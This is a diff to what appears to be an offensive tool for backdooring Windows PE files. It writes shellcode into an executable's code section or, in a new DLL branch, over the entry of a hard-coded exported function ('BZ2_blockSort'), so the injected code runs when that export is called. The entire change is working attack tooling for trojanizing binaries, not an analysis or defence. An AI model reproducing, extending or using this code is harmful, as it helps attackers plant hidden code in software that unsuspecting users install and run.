@@ -45,8 +45,16 @@ Shellcode size    : {len(self.shellcodeData)}
 Code section size : {sect_size}
 ''')
 
-        offset = int((sect_size - len(self.shellcodeData)) / 2)
-        logger.info(f'Inserting shellcode into 0x{offset:X} offset.')
+        if self.superpe.is_dll():
+            offset = self.getExportEntryPoint("BZ2_blockSort")
+            logger.info("Inserting shellcode into DLL at 0x{:X} (sizes: sect {} shellcode {})".format(
+                offset, sect_size, len(self.shellcodeData)
+            ))
+        else:
+            offset = int((sect_size - len(self.shellcodeData)) / 2)
+            logger.info("Inserting shellcode into EXE at 0x{:X} (sizes: sect {} shellcode {})".format(
+                offset, sect_size, len(self.shellcodeData)
+            ))
 
         self.superpe.pe.set_bytes_at_offset(offset, self.shellcodeData)
         self.shellcodeOffset = offset
@@ -92,11 +100,9 @@ Trailing {sect_name} bytes:
         return False
     
     
-    def getExportEntryPoint(self):
+    def getExportEntryPoint(self, exportName):
         dec = lambda x: '???' if x is None else x.decode() 
 
-        #exportName = self.options.get('export', '')
-        exportName = ""
         if len(exportName) == 0:
             logger.critical('Export name not specified! Specify DLL Exported function name to hijack with -e/--export')
 
